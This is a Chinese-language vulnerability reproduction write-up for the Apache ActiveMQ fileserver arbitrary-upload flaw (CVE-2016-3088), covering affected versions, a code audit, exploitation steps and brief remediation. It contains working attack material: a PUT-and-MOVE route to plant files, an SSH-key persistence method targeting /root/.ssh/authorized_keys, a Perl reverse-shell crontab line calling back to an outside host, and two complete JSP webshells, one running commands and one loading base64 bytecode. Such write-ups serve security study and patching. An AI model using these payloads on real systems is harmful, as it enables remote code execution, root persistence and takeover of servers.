
# 0X00 漏洞信息
ActiveMQ 是 Apache 软件基金会下的一个开源消息驱动中间件软件，它支持Java消息服务、集群、Spring Framework等。Jetty 是一个开源的 servlet 容器，它为基于 Java 的 web 容器，例如 JSP 和 servlet 提供运行环境。ActiveMQ 5.0 及以后版本默认集成了jetty。在启动后提供一个监控 ActiveMQ 的 Web 应用。<br />2016年4月14日，国外安全研究人员 Simon Zuckerbraun 曝光 Apache ActiveMQ Fileserver 存在多个安全漏洞，可使远程攻击者用恶意代码替代Web应用，在受影响系统上执行远程代码（CVE-2016-3088）。<br />ActiveMQ中的fileserver服务允许用户通过HTTP PUT方法上传文件到指定目录。Fileserver支持写入文件(不解析jsp),但是支持移动文件(Move)我们可以将jsp的文件PUT到Fileserver下,然后再通过Move指令移动到可执行目录下访问。<br /> ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都须要登陆后才能使用，fileserver无需登陆。<br /> fileserver是一个RESTful API接口，咱们能够经过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操做，其设计目的是为了弥补消息队列操做不能传输、存储二进制文件的缺陷，但后来发现：其使用率并不高并且文件操做容易出现漏洞。 因此，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你能够conf/jetty.xml中开启之）；在5.14.0版本之后，完全删除了fileserver应用。


# 0X01 漏洞概述
| 漏洞名称 | ActiveMQ任意文件上传漏洞 |
| --- | --- |
| 漏洞等级 | 高危 |
| CVE编号 | CVE-2016-3088 |
| CNVD编号 |  |
| CNNVD编号 |  |
| 其他编号 |  |
| 披露时间 | 2016.03.10 |
| 分数 | 9.8 |
| CVSS | CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| 披露链接 | [https://nvd.nist.gov/vuln/detail/CVE-2016-3088](https://nvd.nist.gov/vuln/detail/CVE-2016-3088) |


# 0X02 影响范围
Apache ActiveMQ 5.x ~ 5.14.0<br />在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（可以在conf/jetty.xml中开启之）；<br />在5.14.0版本以后，彻底删除了fileserver应用；


# 0X03 环境搭建
使用vulhub一键搭建<br /> [https://vulhub.org/#/environments/activemq/CVE-2016-3088/](https://vulhub.org/#/environments/activemq/CVE-2016-3088/)
![image-20220121103204503.png](_img/assets/1659511946594-6b4f3998-b569-435f-966e-422dfd0e2ccc.png)

# 0X04 代码审计
ActiveMQ 中的 FileServer 服务允许用户通过 HTTP PUT 方法上传文件到指定目录<br />\activemq-activemq\activemq-fileserver\src\main\java\org\apache\activemq\util\RestFilter.java<br />![image-20220121140836077.png](_img/assets/1659511990183-5277be00-7c3a-4b69-9dde-7f40df1fb3f7.png)

用户可以上传文件到指定目录，该路径在 conf/jetty.xml 中定义<br />activemq-activemq\assembly\src\release\conf\jetty.xml<br />![image-20220121141603200.png](_img/assets/1659512009496-39a518f6-3961-4eb6-882a-fe64edfa4842.png)

顺着 PUT 方法追踪locatefile函数，可以看到调用了如下函数
![image.png](_img/assets/1659512728453-5a2aef05-5f07-4c37-88d3-d87395f41e70.png)

同时看到后台处理 MOVE 的关键代码如下，可以看到该方法没有对目的路径做任何限制或者过滤。<br />![image-20220121142003657.png](_img/assets/1659512024123-35b0caa5-569e-49b0-a3c8-8e43f3d3c35d.png)

可以构造PUT请求上传 webshell 到 fileserver 目录，然后通过 Move 方法将其移动到有执行权限的 admin/ 目录。


# 0X05 漏洞复现
![image-20220121142159326.png](_img/assets/1659512051801-3dc0ef96-f92a-4628-8eed-d4b164013932.png)


## 方法一
查看ActiveMQ的绝对路径
```c
https://192.168.1.40/admin/test/systemProperties.jsp
```
![image-20220121142535746.png](_img/assets/1659512078093-32a7776b-0409-4d32-9e22-aa67cd56e92f.png)

随意抓包， PUT 一个 Jsp 的 Webshell 到 fileserver 目录<br />![image-20220121144239139.png](_img/assets/1659513256193-54900ddd-e521-4340-9a0a-0066d79b602d.png)

移动webshell到可解析目录api下 返回204<br />![image-20220121145654256.png](_img/assets/1659512165428-a5bc3c8e-092b-4358-8dda-eb8899de41b0.png)

执行命令
```javascript
https://192.168.1.40/api/s.jsp?cmd=whoami
```
![image-20220121145922808.png](_img/assets/1659512217061-6e38d6f2-95c1-4735-bead-f698d5d1c367.png)


## 方法二
**条件：**

- ActiveMQ拥有root权限
- 服务器开启ssh服务

既然可以任意文件上传和移动，很自然的可以想到上传我们的 ssh 公钥，从而实现 SSH 方式登录。<br />首先生成密钥对。（如果已存在则不需要）
```javascript
ssh-keygen -t rsa 
```

然后上传id_rsa.pub到服务器、移动到/root/.ssh/并重命名为authorized_keys
![image.png](_img/assets/1659514132408-b43e01b7-5faf-42c5-87b4-65f916a43d35.png)
![image.png](_img/assets/1659514140611-1df9e2a2-15dd-4cac-aed9-19baa9e32d24.png)

之后直接ssh登录即可。


## 方法三
利用定时器，自动化弹shell；<br />注意，换行一定要\n，不能是\r\n，否则crontab执行会失败；

这里利用perl语言写的反弹到VPS上；
```javascript
*/1 * * * * root /usr/bin/perl -e 'use Socket;$i="10.0.0.1";$p=21;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
##
```

crontab格式：
```javascript
minute   hour   day   month   week   command     顺序：分 时 日 月 周 命令
星号（*）：代表所有可能的值；
文件写至`/etc/crontab.d/`中；
具体参考：http://wangchujiang.com/linux-command/c/crontab.html

每1分钟执行一次command：
* * * * * command
```

上传
![image.png](_img/assets/1659514316353-b05e4509-c3f3-45d4-bc9d-dea947436e88.png)

移动cron文件到/etc/cron.d/root
![image.png](_img/assets/1659514330080-4eec57a3-03a7-4122-a46c-b4e160c164cc.png)

等会即可拿到反弹结果；
![image.png](_img/assets/1659514356319-a5cbbd63-dec8-4a62-8045-7febbdc171db.png)

由于是root运行的服务，这里才可写crotab，拿到的shell权限也为root；<br />如果非root启动，此方法同写入SSH一样


# 0X05 木马
浏览器访问：
```javascript
<%@ page import="java.io.*" %>
  <%
  try {
    String cmd = request.getParameter("cmd");
    Process child = Runtime.getRuntime().exec(cmd);
    InputStream in = child.getInputStream();
    int c;
    while ((c = in.read()) != -1) {
      out.print((char)c);
    }
    in.close();
    try {
      child.waitFor();
    } catch (InterruptedException e) {
      e.printStackTrace();
    }
  } catch (IOException e) {
    System.err.println(e);
  }
%>
```

蚁剑连接：
```javascript
<%!
class U extends ClassLoader {
U(ClassLoader c) {
super(c);
}
public Class g(byte[] b) {
return super.defineClass(b, 0, b.length);
}
}
 
public byte[] base64Decode(String str) throws Exception {
try {
Class clazz = Class.forName("sun.misc.BASE64Decoder");
return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
} catch (Exception e) {
Class clazz = Class.forName("java.util.Base64");
Object decoder = clazz.getMethod("getDecoder").invoke(null);
return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
}
}
%>
<%
String cls = request.getParameter("passwd");
if (cls != null) {
new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
}
%>
```


# 0X06 解决方案
1、ActiveMQ Fileserver 的功能在 5.14.0 及其以后的版本中已被移除。建议用户升级至 5.14.0 及其以后版本。<br />2、通过移除 conf\jetty.xml 的以下配置来禁用 ActiveMQ Fileserver 功能
